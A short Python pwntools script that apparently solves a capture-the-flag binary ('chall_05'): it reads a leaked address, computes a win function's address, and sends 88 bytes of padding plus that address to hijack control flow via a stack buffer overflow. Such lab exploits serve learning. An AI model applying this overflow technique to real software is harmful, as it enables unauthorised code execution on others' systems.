# coding: utf-8
from pwn import *
p=process("./chall_05")
p.recvuntil(b": ")
winad = int(p.recvline(), 16) - 23
payload = b"A"*88 + p64(winad)
p.sendline(payload)
p.interactive()
